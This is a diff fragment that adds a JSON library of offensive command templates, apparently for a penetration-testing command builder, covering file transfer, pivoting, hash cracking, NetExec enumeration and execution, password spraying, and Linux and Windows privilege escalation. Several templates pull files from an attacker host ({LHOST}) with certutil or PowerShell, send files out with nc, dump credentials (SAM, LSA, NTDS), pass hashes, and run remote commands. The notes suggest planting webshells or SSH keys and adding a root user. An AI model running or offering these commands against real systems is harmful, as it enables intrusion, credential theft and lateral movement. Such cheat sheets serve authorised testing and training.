+    "notes": ""
+  },
+  {
+    "id": "ft-certutil",
+    "group": "File Transfer",
+    "category": "Fetch (Windows)",
+    "name": "certutil",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "certutil -urlcache -f http://{LHOST}/{FILE} {FILE}",
+    "notes": "Classic Windows LOLBin download."
+  },
+  {
+    "id": "ft-ps-download",
+    "group": "File Transfer",
+    "category": "Fetch (Windows)",
+    "name": "PowerShell DownloadFile",
+    "type": "powershell",
+    "encoding": "raw",
+    "template": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{LHOST}/{FILE}','C:\\Windows\\Temp\\{FILE}')\"",
+    "notes": "IWR alternative: iwr http://{LHOST}/{FILE} -o {FILE}"
+  },
+  {
+    "id": "ft-scp",
+    "group": "File Transfer",
+    "category": "Fetch (Linux)",
+    "name": "scp",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "scp {FILE} {USER}@{TARGET}:/tmp/{FILE}",
+    "notes": "If you have SSH creds."
+  },
+  {
+    "id": "piv-chisel-server",
+    "group": "Pivoting & Tunneling",
+    "category": "Chisel",
+    "name": "chisel server (attacker)",
+    "type": "chisel",
+    "encoding": "raw",
+    "template": "chisel server -p {LPORT} --reverse",
+    "options": [
+      "-v"
+    ],
+    "notes": "Run on your attack host. SOCKS lands on 1080."
+  },
+  {
+    "id": "piv-chisel-client",
+    "group": "Pivoting & Tunneling",
+    "category": "Chisel",
+    "name": "chisel client R:socks (target)",
+    "type": "chisel",
+    "encoding": "raw",
+    "template": "./chisel client {LHOST}:{LPORT} R:socks",
+    "options": [
+      "-v"
+    ],
+    "notes": "Reverse SOCKS5. Then proxychains via 1080."
+  },
+  {
+    "id": "piv-ssh-d",
+    "group": "Pivoting & Tunneling",
+    "category": "SSH",
+    "name": "ssh dynamic (SOCKS)",
+    "type": "ssh",
+    "encoding": "raw",
+    "template": "ssh -D 9050 {USER}@{TARGET}",
+    "options": [
+      "-N",
+      "-f",
+      "-v",
+      "-o StrictHostKeyChecking=no"
+    ],
+    "notes": "SOCKS proxy on 9050 through the pivot."
+  },
+  {
+    "id": "piv-ssh-l",
+    "group": "Pivoting & Tunneling",
+    "category": "SSH",
+    "name": "ssh local forward",
+    "type": "ssh",
+    "encoding": "raw",
+    "template": "ssh -L {LPORT}:127.0.0.1:{RPORT} {USER}@{TARGET}",
+    "options": [
+      "-N",
+      "-f",
+      "-v",
+      "-o StrictHostKeyChecking=no"
+    ],
+    "notes": "Reach the pivot's RPORT on your local LPORT."
+  },
+  {
+    "id": "piv-ssh-r",
+    "group": "Pivoting & Tunneling",
+    "category": "SSH",
+    "name": "ssh remote forward",
+    "type": "ssh",
+    "encoding": "raw",
+    "template": "ssh -R {RPORT}:127.0.0.1:{LPORT} {USER}@{TARGET} -vN",
+    "options": [
+      "-N",
+      "-f",
+      "-v",
+      "-o StrictHostKeyChecking=no"
+    ],
+    "notes": "Expose your local LPORT on the pivot's RPORT."
+  },
+  {
+    "id": "piv-socat",
+    "group": "Pivoting & Tunneling",
+    "category": "Socat",
+    "name": "socat port redirect",
+    "type": "socat",
+    "encoding": "raw",
+    "template": "socat TCP4-LISTEN:{LPORT},fork TCP4:{TARGET}:{RPORT}",
+    "notes": "Relay local LPORT to TARGET:RPORT."
+  },
+  {
+    "id": "piv-proxychains",
+    "group": "Pivoting & Tunneling",
+    "category": "Socat",
+    "name": "proxychains nmap",
+    "type": "proxychains",
+    "encoding": "raw",
+    "template": "proxychains -q nmap -sT -Pn {TARGET}",
+    "notes": "Needs socks in /etc/proxychains.conf (1080/9050). TCP connect scan only."
+  },
+  {
+    "id": "crack-kerberoast",
+    "group": "Cracking",
+    "category": "Hashcat",
+    "name": "hashcat: Kerberoast TGS",
+    "type": "hashcat",
+    "encoding": "raw",
+    "template": "hashcat -m 13100 spns.txt {WORDLIST}",
+    "options": [
+      "-O",
+      "-w 3",
+      "--force",
+      "--show",
+      "--username",
+      "-r /usr/share/hashcat/rules/best64.rule"
+    ],
+    "notes": "TGS-REP. WORDLIST e.g. /usr/share/wordlists/rockyou.txt."
+  },
+  {
+    "id": "crack-asrep",
+    "group": "Cracking",
+    "category": "Hashcat",
+    "name": "hashcat: AS-REP",
+    "type": "hashcat",
+    "encoding": "raw",
+    "template": "hashcat -m 18200 asrep.txt {WORDLIST}",
+    "options": [
+      "-O",
+      "-w 3",
+      "--force",
+      "--show",
+      "--username",
+      "-r /usr/share/hashcat/rules/best64.rule"
+    ],
+    "notes": "AS-REP roast hashes ($krb5asrep$)."
+  },
+  {
+    "id": "crack-ntlmv2",
+    "group": "Cracking",
+    "category": "Hashcat",
+    "name": "hashcat: NetNTLMv2",
+    "type": "hashcat",
+    "encoding": "raw",
+    "template": "hashcat -m 5600 ntlmv2.txt {WORDLIST}",
+    "options": [
+      "-O",
+      "-w 3",
+      "--force",
+      "--show",
+      "--username",
+      "-r /usr/share/hashcat/rules/best64.rule"
+    ],
+    "notes": "Captured by Responder/ntlmrelayx."
+  },
+  {
+    "id": "crack-ntlm",
+    "group": "Cracking",
+    "category": "Hashcat",
+    "name": "hashcat: NTLM",
+    "type": "hashcat",
+    "encoding": "raw",
+    "template": "hashcat -m 1000 ntlm.txt {WORDLIST}",
+    "options": [
+      "-O",
+      "-w 3",
+      "--force",
+      "--show",
+      "--username",
+      "-r /usr/share/hashcat/rules/best64.rule"
+    ],
+    "notes": "Raw NTLM (from secretsdump)."
+  },
+  {
+    "id": "crack-john",
+    "group": "Cracking",
+    "category": "John",
+    "name": "john (wordlist)",
+    "type": "john",
+    "encoding": "raw",
+    "template": "john --wordlist={WORDLIST} hashes.txt",
+    "options": [
+      "--show",
+      "--rules",
+      "--format=NT"
+    ],
+    "notes": "--format=... if autodetect is wrong. --show to print cracked."
+  },
+  {
+    "id": "nxc-smb-enum",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — enumerate",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -p {PASS}",
+    "options": [
+      "--shares",
+      "--users",
+      "--groups",
+      "--local-groups",
+      "--loggedon-users",
+      "--sessions",
+      "--disks",
+      "--pass-pol",
+      "--rid-brute",
+      "--computers"
+    ],
+    "notes": "Toggle what to enumerate. TARGET can be host, CIDR, or a file. 'Pwn3d!' = admin."
+  },
+  {
+    "id": "nxc-smb-unauth",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — unauthenticated checks",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET}",
+    "options": [
+      "--null-session",
+      "--guest-logon",
+      "--signing",
+      "--smbv1"
+    ],
+    "notes": "No creds. --signing lists relay candidates; --null-session/--guest-logon test anon access."
+  },
+  {
+    "id": "nxc-smb-spray",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — password spray",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {WORDLIST} -p {PASS} --continue-on-success",
+    "options": [
+      "--local-auth",
+      "--no-bruteforce"
+    ],
+    "notes": "USER field = a users file. --no-bruteforce pairs user[i] with pass[i]. Mind lockout."
+  },
+  {
+    "id": "nxc-smb-pth",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — pass-the-hash",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -H {HASH}",
+    "options": [
+      "--local-auth",
+      "--shares",
+      "--sam",
+      "--lsa"
+    ],
+    "notes": "NTLM PtH. Drop --local-auth for a domain account."
+  },
+  {
+    "id": "nxc-smb-dump",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — dump credentials",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -p {PASS}",
+    "options": [
+      "--sam",
+      "--lsa",
+      "--ntds",
+      "--dpapi",
+      "--laps"
+    ],
+    "notes": "--ntds needs DA/DCSync rights (run against a DC). --sam/--lsa need local admin."
+  },
+  {
+    "id": "nxc-smb-exec",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — command exec",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -p {PASS} -x {CMD}",
+    "options": [
+      "--local-auth"
+    ],
+    "notes": "Add --exec-method smbexec|wmiexec|atexec|mmcexec via Extra args. Use -X for PowerShell."
+  },
+  {
+    "id": "nxc-smb-psexec",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — PowerShell exec (-X)",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -p {PASS} -X {CMD}",
+    "options": [
+      "--local-auth"
+    ],
+    "notes": "Runs CMD as a PowerShell payload."
+  },
+  {
+    "id": "nxc-smb-put",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — put file",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -p {PASS} --put-file {FILE} {RFILE}",
+    "notes": "RFILE = remote path, e.g. \\\\Windows\\\\Temp\\\\out.exe."
+  },
+  {
+    "id": "nxc-smb-get",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — get file",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -p {PASS} --get-file {RFILE} {FILE}",
+    "notes": "RFILE = remote source path, FILE = local destination."
+  },
+  {
+    "id": "nxc-smb-spider",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — spider shares (spider_plus)",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -p {PASS} -M spider_plus",
+    "notes": "Recursively lists readable share files to JSON. -o READ_ONLY=false to download."
+  },
+  {
+    "id": "nxc-smb-module",
+    "group": "NetExec (nxc)",
+    "category": "SMB",
+    "name": "nxc smb — run module (-M)",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -p {PASS} -M {MODULE}",
+    "notes": "Common: lsassy, nanodump, gpp_password, gpp_autologin, spider_plus, enum_av, ms17-010, zerologon, printnightmare, coerce_plus. -L to list modules."
+  },
+  {
+    "id": "nxc-ldap-enum",
+    "group": "NetExec (nxc)",
+    "category": "LDAP",
+    "name": "nxc ldap — enumerate",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc ldap {DC_IP} -u {USER} -p {PASS}",
+    "options": [
+      "--users",
+      "--groups",
+      "--admin-count",
+      "--password-not-required",
+      "--trusted-for-delegation",
+      "--gmsa",
+      "--trusts",
+      "--get-sid"
+    ],
+    "notes": "Credentialed LDAP enumeration. Toggle what to pull."
+  },
+  {
+    "id": "nxc-ldap-asrep",
+    "group": "NetExec (nxc)",
+    "category": "LDAP",
+    "name": "nxc ldap — AS-REP roast",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc ldap {DC_IP} -u {USER} -p {PASS} --asreproast asrep.txt",
+    "notes": "Writes $krb5asrep$ hashes. Crack: hashcat -m 18200."
+  },
+  {
+    "id": "nxc-ldap-kerb",
+    "group": "NetExec (nxc)",
+    "category": "LDAP",
+    "name": "nxc ldap — kerberoast",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc ldap {DC_IP} -u {USER} -p {PASS} --kerberoasting kerb.txt",
+    "notes": "Writes TGS-REP hashes. Crack: hashcat -m 13100."
+  },
+  {
+    "id": "nxc-ldap-bh",
+    "group": "NetExec (nxc)",
+    "category": "LDAP",
+    "name": "nxc ldap — BloodHound collect",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc ldap {DC_IP} -u {USER} -p {PASS} --bloodhound --collection All --dns-server {DC_IP}",
+    "notes": "Runs the built-in BloodHound ingestor and writes a zip."
+  },
+  {
+    "id": "nxc-ldap-groupmem",
+    "group": "NetExec (nxc)",
+    "category": "LDAP",
+    "name": "nxc ldap — group members (-M group-mem)",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc ldap {DC_IP} -u {USER} -p {PASS} -M group-mem -o GROUP={TARGET}",
+    "notes": "Set TARGET to the group name, e.g. \"Domain Admins\"."
+  },
+  {
+    "id": "nxc-winrm-check",
+    "group": "NetExec (nxc)",
+    "category": "WinRM",
+    "name": "nxc winrm — validate",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc winrm {TARGET} -u {USER} -p {PASS}",
+    "options": [
+      "--local-auth"
+    ],
+    "notes": "'Pwn3d!' = you can evil-winrm in."
+  },
+  {
+    "id": "nxc-winrm-exec",
+    "group": "NetExec (nxc)",
+    "category": "WinRM",
+    "name": "nxc winrm — command exec",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc winrm {TARGET} -u {USER} -p {PASS} -x {CMD}",
+    "options": [
+      "--local-auth"
+    ],
+    "notes": "Use -X for PowerShell (edit via Extra args)."
+  },
+  {
+    "id": "nxc-mssql-check",
+    "group": "NetExec (nxc)",
+    "category": "MSSQL",
+    "name": "nxc mssql — validate",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc mssql {TARGET} -u {USER} -p {PASS}",
+    "options": [
+      "--local-auth",
+      "--windows-auth"
+    ],
+    "notes": "--windows-auth for domain SSO; default is SQL auth."
+  },
+  {
+    "id": "nxc-mssql-exec",
+    "group": "NetExec (nxc)",
+    "category": "MSSQL",
+    "name": "nxc mssql — xp_cmdshell exec",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc mssql {TARGET} -u {USER} -p {PASS} -x {CMD}",
+    "options": [
+      "--local-auth",
+      "--windows-auth"
+    ],
+    "notes": "Auto-enables xp_cmdshell if you're sysadmin. Use -X for PowerShell."
+  },
+  {
+    "id": "nxc-mssql-query",
+    "group": "NetExec (nxc)",
+    "category": "MSSQL",
+    "name": "nxc mssql — run query",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc mssql {TARGET} -u {USER} -p {PASS} -q {QUERY}",
+    "notes": "e.g. QUERY = \"SELECT name FROM sys.databases\"."
+  },
+  {
+    "id": "nxc-ssh",
+    "group": "NetExec (nxc)",
+    "category": "Other protocols",
+    "name": "nxc ssh — spray / validate",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc ssh {TARGET} -u {USER} -p {PASS}",
+    "options": [
+      "--continue-on-success"
+    ],
+    "notes": "USER/PASS accept files. Add -x for command exec via Extra args."
+  },
+  {
+    "id": "nxc-ftp",
+    "group": "NetExec (nxc)",
+    "category": "Other protocols",
+    "name": "nxc ftp — spray / validate",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc ftp {TARGET} -u {USER} -p {PASS}",
+    "options": [
+      "--continue-on-success"
+    ],
+    "notes": "Add --ls / --get via Extra args."
+  },
+  {
+    "id": "nxc-rdp",
+    "group": "NetExec (nxc)",
+    "category": "Other protocols",
+    "name": "nxc rdp — validate / screenshot",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc rdp {TARGET} -u {USER} -p {PASS}",
+    "options": [
+      "--local-auth",
+      "--screenshot",
+      "--nla-screenshot"
+    ],
+    "notes": "--nla-screenshot grabs the pre-auth login screen without creds."
+  },
+  {
+    "id": "nxc-wmi",
+    "group": "NetExec (nxc)",
+    "category": "Other protocols",
+    "name": "nxc wmi — command exec",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc wmi {TARGET} -u {USER} -p {PASS} -x {CMD}",
+    "options": [
+      "--local-auth"
+    ],
+    "notes": "DCOM/WMI execution path."
+  },
+  {
+    "id": "nxc-nfs",
+    "group": "NetExec (nxc)",
+    "category": "Other protocols",
+    "name": "nxc nfs — enumerate",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc nfs {TARGET}",
+    "options": [
+      "--shares"
+    ],
+    "notes": "Lists NFS exports. Add --get-file / --put-file via Extra args."
+  },
+  {
+    "id": "nxc-vnc",
+    "group": "NetExec (nxc)",
+    "category": "Other protocols",
+    "name": "nxc vnc — validate",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc vnc {TARGET} -p {PASS}",
+    "options": [
+      "--screenshot"
+    ],
+    "notes": "VNC auth check; --screenshot grabs the desktop."
+  },
+  {
+    "id": "enum-showmount",
+    "group": "Enumeration",
+    "category": "NFS",
+    "name": "showmount NFS exports",
+    "type": "nfs",
+    "encoding": "raw",
+    "template": "showmount -e {TARGET}",
+    "options": [
+      "-a",
+      "-d"
+    ],
+    "notes": "no_root_squash export -> mount and drop a SUID root binary."
+  },
+  {
+    "id": "enum-smtp-userenum",
+    "group": "Enumeration",
+    "category": "SMTP",
+    "name": "smtp-user-enum",
+    "type": "smtp",
+    "encoding": "raw",
+    "template": "smtp-user-enum -M VRFY -U {WORDLIST} -t {TARGET}",
+    "options": [],
+    "notes": "VRFY/EXPN/RCPT user enumeration on port 25."
+  },
+  {
+    "id": "enum-onesixtyone",
+    "group": "Enumeration",
+    "category": "SNMP",
+    "name": "onesixtyone (community brute)",
+    "type": "snmp",
+    "encoding": "raw",
+    "template": "onesixtyone -c {WORDLIST} {TARGET}",
+    "options": [],
+    "notes": "Brute-force SNMP community strings."
+  },
+  {
+    "id": "enum-whatweb",
+    "group": "Enumeration",
+    "category": "Web",
+    "name": "whatweb fingerprint",
+    "type": "whatweb",
+    "encoding": "raw",
+    "template": "whatweb {URL}",
+    "options": [
+      "-a 3",
+      "-v"
+    ],
+    "notes": "Identify web tech stack / CMS."
+  },
+  {
+    "id": "enum-rpc-enumusers",
+    "group": "Enumeration",
+    "category": "SMB",
+    "name": "rpcclient enum users",
+    "type": "rpcclient",
+    "encoding": "raw",
+    "template": "rpcclient -U \"\" -N {TARGET} -c enumdomusers",
+    "options": [],
+    "notes": "Anonymous user enumeration via RPC."
+  },
+  {
+    "id": "enum-ldapsearch-users",
+    "group": "Enumeration",
+    "category": "LDAP",
+    "name": "ldapsearch users",
+    "type": "ldapsearch",
+    "encoding": "raw",
+    "template": "ldapsearch -x -H ldap://{DC_IP} -b \"DC={DOMAIN}\" \"(objectClass=user)\" sAMAccountName",
+    "options": [
+      "-LLL",
+      "-E pr=1000/noprompt"
+    ],
+    "notes": "Replace DC={DOMAIN} with the real base DN (DC=corp,DC=local)."
+  },
+  {
+    "id": "web-wfuzz-dir",
+    "group": "Web Attacks",
+    "category": "Content Discovery",
+    "name": "wfuzz dir",
+    "type": "wfuzz",
+    "encoding": "raw",
+    "template": "wfuzz -c -z file,{WORDLIST} --hc 404 {URL}/FUZZ",
+    "options": [
+      "--hw 0",
+      "-t 40"
+    ],
+    "notes": "Classic wfuzz content discovery."
+  },
+  {
+    "id": "web-gobuster-vhost",
+    "group": "Web Attacks",
+    "category": "Content Discovery",
+    "name": "gobuster vhost",
+    "type": "gobuster",
+    "encoding": "raw",
+    "template": "gobuster vhost -u {URL} -w {WORDLIST} --append-domain",
+    "options": [
+      "-x php,txt,html",
+      "-t 50",
+      "-k",
+      "-b 404,403",
+      "-e",
+      "-r",
+      "-q",
+      "--no-error"
+    ],
+    "notes": "Virtual-host brute forcing."
+  },
+  {
+    "id": "web-gobuster-dns",
+    "group": "Web Attacks",
+    "category": "Content Discovery",
+    "name": "gobuster dns",
+    "type": "gobuster",
+    "encoding": "raw",
+    "template": "gobuster dns -d {DOMAIN} -w {WORDLIST}",
+    "options": [
+      "-x php,txt,html",
+      "-t 50",
+      "-k",
+      "-b 404,403",
+      "-e",
+      "-r",
+      "-q",
+      "--no-error"
+    ],
+    "notes": "Subdomain brute forcing."
+  },
+  {
+    "id": "web-curl-headers",
+    "group": "Web Attacks",
+    "category": "Scanning",
+    "name": "curl headers",
+    "type": "web",
+    "encoding": "raw",
+    "template": "curl -sILk {URL}",
+    "options": [
+      "-v",
+      "-x http://127.0.0.1:8080",
+      "-H 'User-Agent: x'"
+    ],
+    "notes": "Inspect response headers; -x to route via Burp."
+  },
+  {
+    "id": "web-wpscan-pw",
+    "group": "Web Attacks",
+    "category": "CMS",
+    "name": "wpscan password attack",
+    "type": "wpscan",
+    "encoding": "raw",
+    "template": "wpscan --url {URL} --usernames {USER} --passwords {WORDLIST}",
+    "options": [
+      "--enumerate u,ap,at",
+      "--plugins-detection aggressive",
+      "--random-user-agent",
+      "--disable-tls-checks"
+    ],
+    "notes": "Brute WP creds via xmlrpc/login."
+  },
+  {
+    "id": "db-redis",
+    "group": "Databases",
+    "category": "Redis",
+    "name": "redis-cli connect",
+    "type": "redis",
+    "encoding": "raw",
+    "template": "redis-cli -h {TARGET}",
+    "options": [],
+    "notes": "Often no auth. Then: INFO, CONFIG GET dir, module load, write webshell/ssh key."
+  },
+  {
+    "id": "pe-crontab",
+    "group": "Privilege Escalation",
+    "category": "Linux",
+    "name": "cron jobs",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "cat /etc/crontab; ls -la /etc/cron*",
+    "notes": "Writable script run by root cron = privesc."
+  },
+  {
+    "id": "pe-writable-dirs",
+    "group": "Privilege Escalation",
+    "category": "Linux",
+    "name": "writable dirs/files",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "find / -writable -type d 2>/dev/null; find / -writable -type f 2>/dev/null | grep -v proc",
+    "notes": "World-writable paths and files."
+  },
+  {
+    "id": "pe-pspy",
+    "group": "Privilege Escalation",
+    "category": "Linux",
+    "name": "pspy (watch processes)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "./pspy64 -pf -i 1000",
+    "notes": "See root cron/processes without root. Upload pspy64 first."
+  },
+  {
+    "id": "pe-kernel",
+    "group": "Privilege Escalation",
+    "category": "Linux",
+    "name": "kernel / OS version",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "uname -a; cat /etc/os-release; cat /etc/issue",
+    "notes": "Feed to searchsploit (DirtyCow/DirtyPipe/PwnKit)."
+  },
+  {
+    "id": "pe-passwd-writable",
+    "group": "Privilege Escalation",
+    "category": "Linux",
+    "name": "/etc/passwd writable?",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "ls -la /etc/passwd /etc/shadow",
+    "notes": "Writable passwd -> add root user with openssl passwd hash."
+  },
+  {
+    "id": "pe-win-net",
+    "group": "Privilege Escalation",
+    "category": "Windows",
+    "name": "users & groups",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "net user; net localgroup administrators",
+    "notes": "Local users and admins."
+  },
+  {
+    "id": "pe-win-qfe",
+    "group": "Privilege Escalation",
+    "category": "Windows",
+    "name": "installed patches (QFE)",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "wmic qfe get Caption,Description,HotFixID,InstalledOn",
+    "notes": "Missing-patch privesc (compare with wesng)."
+  },
+  {
+    "id": "pe-win-unquoted",
+    "group": "Privilege Escalation",
+    "category": "Windows",
+    "name": "unquoted service paths",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"",
+    "notes": "Unquoted path with spaces + writable dir = SYSTEM."
+  },
+  {
+    "id": "pe-win-powerup",
+    "group": "Privilege Escalation",
+    "category": "Windows",
+    "name": "PowerUp Invoke-AllChecks",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"",
+    "notes": "Automated Windows privesc checks."
+  },
+  {
+    "id": "pe-win-autologon",
+    "group": "Privilege Escalation",
+    "category": "Windows",
+    "name": "autologon creds (registry)",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+    "notes": "DefaultUserName/DefaultPassword if set."
+  },
+  {
+    "id": "ad-getadusers",
+    "group": "Active Directory",
+    "category": "Credentialed",
+    "name": "GetADUsers (list users)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "GetADUsers.py -all {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP}",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "Dump all domain users + last logon."
+  },
+  {
+    "id": "ad-gettgt",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "getTGT (request ticket)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "getTGT.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP}",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "Then: export KRB5CCNAME=user.ccache and use -k on other tools."
+  },
+  {
+    "id": "ad-certipy-find",
+    "group": "Active Directory",
+    "category": "Credentialed",
+    "name": "certipy find (ADCS)",
+    "type": "certipy",
+    "encoding": "raw",
+    "template": "certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC_IP}",
+    "options": [
+      "-vulnerable",
+      "-enabled",
+      "-stdout"
+    ],
+    "notes": "Enumerate AD CS templates; toggle -vulnerable for ESC1-8."
+  },
+  {
+    "id": "ad-ldapdomaindump",
+    "group": "Active Directory",
+    "category": "Credentialed",
+    "name": "ldapdomaindump",
+    "type": "ldapdomaindump",
+    "encoding": "raw",
+    "template": "ldapdomaindump -u {DOMAIN}\\{USER} -p {PASS} {DC_IP}",
+    "options": [],
+    "notes": "HTML/JSON dump of users, groups, computers."
+  },
+  {
+    "id": "ft-nc-recv",
+    "group": "File Transfer",
+    "category": "Serve (attacker)",
+    "name": "nc receive file",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "nc -lvnp {LPORT} > {FILE}",
+    "notes": "On target: nc {LHOST} {LPORT} < file"
+  },
+  {
+    "id": "ft-nc-send",
+    "group": "File Transfer",
+    "category": "Fetch (Linux)",
+    "name": "nc send file",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "nc {LHOST} {LPORT} < {FILE}",
+    "notes": "Pair with the nc-receive listener on your host."
+  },
+  {
+    "id": "ft-base64",
+    "group": "File Transfer",
+    "category": "Fetch (Linux)",
+    "name": "base64 copy-paste",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "base64 -w0 {FILE}",
+    "notes": "Copy output; on target: echo <b64> | base64 -d > {FILE}"
+  },
+  {
+    "id": "piv-sshuttle",
+    "group": "Pivoting & Tunneling",
+    "category": "SSH",
+    "name": "sshuttle (VPN-like)",
+    "type": "ssh",
+    "encoding": "raw",
+    "template": "sshuttle -r {USER}@{TARGET} {RHOST}",
+    "options": [
+      "-N",
+      "-f",
+      "-v",
+      "-o StrictHostKeyChecking=no"
+    ],
+    "notes": "RHOST = target subnet, e.g. 10.10.5.0/24. Routes it through SSH."
+  },
+  {
+    "id": "crack-ssh2john",
+    "group": "Cracking",
+    "category": "John",
+    "name": "crack SSH key (ssh2john)",
+    "type": "john",
+    "encoding": "raw",
+    "template": "ssh2john id_rsa > ssh.hash && john --wordlist={WORDLIST} ssh.hash",
+    "options": [
+      "--show",
+      "--rules",
+      "--format=NT"
+    ],
+    "notes": "Crack a passphrase-protected private key."
+  },
+  {
+    "id": "crack-fcrackzip",
+    "group": "Cracking",
+    "category": "John",
+    "name": "crack zip (fcrackzip)",
+    "type": "fcrackzip",
+    "encoding": "raw",
+    "template": "fcrackzip -u -D -p {WORDLIST} secret.zip",
+    "options": [
+      "-v"
+    ],
+    "notes": "Dictionary attack on a password-protected zip."
+  }
+]
